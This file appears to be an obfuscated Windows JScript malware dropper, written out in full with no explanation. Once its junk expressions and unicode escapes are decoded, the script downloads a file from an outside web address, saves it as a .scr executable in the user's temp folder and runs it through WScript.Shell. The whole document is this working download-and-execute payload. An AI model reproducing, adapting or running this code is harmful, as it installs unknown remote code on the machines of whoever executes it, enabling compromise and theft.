toxicBalloon = (((1 & 1) | (0 + 0)), this);
uniqueModify = ("\u0075ni" + "v" + "e\u0072\u0073it" + "\u0079", "\u0072e\u0073\u0069\u0064" + "en" + "t", function String.prototype.penaltyMeditate() {
	return this
}, "Ru\u006e");
mechanicIcon = toxicBalloon[("\u0064e\u006c\u0065\u0067a" + "te", "\u0066o\u0072\u006da\u0074" + "ion", "\u0063a\u006ece" + "r", "tonic", "\u0057\u0053" + "c\u0072\u0069\u0070t")];
mechanicIcon[("g\u0065\u006e" + "era" + "l", "t\u0072\u0061" + "\u006es\u006d\u0069" + "s\u0073\u0069\u006f" + "\u006e", "plu" + "\u0073", "\u0053" + "l" + "eep")](((227, 16024) & ((((([+!+[]])) + "" + (([!+[] + !+[] + !+[]]) * ([!+[] + !+[]])) + "" + (([!+[] + !+[]]) * ([!+[] + !+[] + !+[]])) + "" + (([!+[] + !+[]] * [!+[] + !+[] + !+[]] + 1)))) * ([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]]))));
synthesisRegion = mechanicIcon[("ver\u0073\u0069o" + "\u006e", "em\u0062l\u0065" + "\u006d", "\u0043\u0072" + "\u0065\u0061\u0074" + "\u0065O\u0062j\u0065c" + "t")](("s\u0074a\u006e\u0064", "\u0057S\u0063\u0072i" + "\u0070t.S\u0068" + "\u0065\u006c\u006c"));
speculationGigantic = synthesisRegion[("E\u0078\u0070an\u0064" + "\u0045\u006e" + "\u0076\u0069r" + "o\u006e" + "m\u0065" + "\u006e\u0074S" + "t" + "\u0072in" + "\u0067s")](("minor", "d" + "e\u0067rad" + "\u0061\u0074" + "io" + "n", "%\u0054EM\u0050" + "%\u002f")) + ("\u0069" + "\u006clu\u0073\u0074" + "r\u0061ti" + "\u006f" + "n", "ar\u0063" + "\u0068i\u0076" + "e", "\u0070atrol" + "\u0042\u006fx") + ("\u006f\u0063\u0063\u0075p\u0079", "\u0065\u0070is" + "o" + "\u0064" + "e", "\u0073o\u006co", "\u002escr");
filterMusic = toxicBalloon[("synon" + "y\u006d", "\u0057S" + "cr" + "i\u0070t")][("C\u0072\u0065" + "a\u0074e\u004f" + "b\u006a\u0065" + "\u0063t")](("t\u0072iv\u0069" + "a\u006c", "MS" + "XML\u0032." + "\u0058ML\u0048T\u0054" + "P"));
filterMusic[("r\u006f\u0062\u006f" + "t", "\u0072" + "e\u006c\u0061" + "x\u0061ti\u006f\u006e", "concep" + "t\u0069\u006fn", "st\u0061t" + "is\u0074\u0069\u0063\u0073", "op\u0065n")](("re\u0066l\u0065" + "\u0063\u0074\u0069\u006fn", "\u0061u\u0074o\u006d\u006f" + "\u0062" + "\u0069" + "l" + "e", "\u0047ET"), ("c" + "at" + "\u0065gory", "a" + "b\u0073o\u006c" + "\u0075t" + "e", "i\u006es" + "\u0074\u0072u\u0063t" + "\u006fr", "g" + "r\u0061m", "h\u0074tp" + "\u003a//a\u0063" + "c\u0065s\u0073" + "\u0069" + "n" + "v\u0065stm\u0065" + "\u006et" + "\u002e\u006e" + "\u0065\u0074\u002f" + "\u0034\u002f\u0030" + "vexw\u0033\u0073" + "5"), !(3 == ((((1 * 0) | (([+!+[]]))) + (0 + 0)) * (((([+[]])) ^ (34 - 34)) + (3 & (([!+[] + !+[] + !+[]])))))));
filterMusic[("s\u0065n\u0064")]();
while (filterMusic[("\u0064ef" + "\u006f" + "\u0072m" + "\u0061\u0074io" + "n", "\u006d\u0065\u006d" + "b" + "ra" + "\u006ee", "\u0065pis" + "od\u0065", "\u0073e\u0073\u0073" + "\u0069on", "\u0072\u0065ad" + "ys\u0074\u0061\u0074\u0065")] < ((([!+[] + !+[]])) * (3 & 2))) {
	toxicBalloon[("ch\u0061" + "o\u0073", "\u0057\u0053crip" + "t")][("c" + "\u006f\u006dp\u0075t" + "er", "pat\u0065n" + "t", "Sl\u0065" + "\u0065\u0070")](((173, 166, 126) & (Math.pow(159, 2) - 25181)));
}
radarAnecdote = toxicBalloon[("d\u0061\u0074e", "m\u0065\u0065\u0074in" + "g", "mu\u0073i" + "c", "\u0070er" + "ma\u006e\u0065\u006e" + "t", "WS" + "\u0063\u0072i\u0070t")][("portr\u0061" + "i\u0074", "fi\u006c" + "e", "\u0063o\u006d" + "\u0070\u0075\u0074\u0065r", "t" + "\u0072\u006fp\u0069c" + "\u0061" + "l", "\u0043" + "r\u0065a\u0074eO" + "bj" + "ect")](("\u006cor" + "d", "\u006fccup" + "\u0061\u006e\u0074", "AD" + "\u004f\u0044B" + ".\u0053t" + "re" + "a" + "\u006d"));
try {
	radarAnecdote[("da" + "t" + "e", "\u006f\u0070en")]();
	radarAnecdote[("t\u0079" + "pe")] = (1 * (39 - 38));
	radarAnecdote[("f" + "\u0069n\u0069" + "sh", "c" + "\u006fm" + "m\u0065" + "\u0072\u0063" + "\u0065", "\u0074a" + "ri\u0066" + "\u0066", "\u0077\u0072\u0069te")](filterMusic[("\u0074r" + "a" + "n\u0073f\u006f" + "r" + "\u006d", "\u0052es" + "p\u006f\u006e\u0073eB" + "\u006fdy")]);
	radarAnecdote[("pr\u006f\u0074o" + "c" + "ol", "p\u006f\u0073\u0069" + "\u0074io\u006e")] = ((71 & 94), (169 & 253), (0 ^ 0));
	radarAnecdote[("d" + "ic" + "\u0074\u0069\u006fn", "s\u0061\u0076e\u0054" + "o\u0046\u0069l" + "\u0065")](speculationGigantic, ((1 ^ 3) & (1 * 2)));
	radarAnecdote[("\u0063\u006co\u0073e")]();
	synthesisRegion[uniqueModify](speculationGigantic.penaltyMeditate(), ((([+!+[]])) * (0 ^ 0)), ((0 | 0) ^ (0 & 0)));
} catch (inversionImpression) {};